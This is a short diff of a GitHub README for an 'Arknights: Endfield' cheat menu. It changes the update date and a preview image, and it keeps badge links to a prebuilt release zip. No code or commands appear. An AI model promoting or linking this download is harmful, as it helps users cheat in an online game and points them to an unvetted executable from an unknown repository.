@@ -1,6 +1,6 @@
 # Arknights: Endfield Cheat Menu
 
-(UPD: 29 Aug 2026)
+ _(UPD: 30 Aug 2026)_
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.5/Endfield.GUI-v1.5.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.5-blue?style=for-the-badge)](https://github.com/colonylegendsport/Endfield-Hack-V1/releases/download/v1.5/Endfield.GUI-v1.5.zip)
@@ -13,7 +13,7 @@
 
 ## Features
 
-![Arknights Endfield Cheat Preview Hack](https://github.com/colonylegendsport/Endfield-Hack-V1/blob/main/assets/image.png)
+![Arknights Endfield Cheat Preview Hack](https://github.com/colonylegendsport/Endfield-Hack-V1/blob/main/assets/image.jpg)
 
 | Player | World | Misc |
 |-------|--------|------|
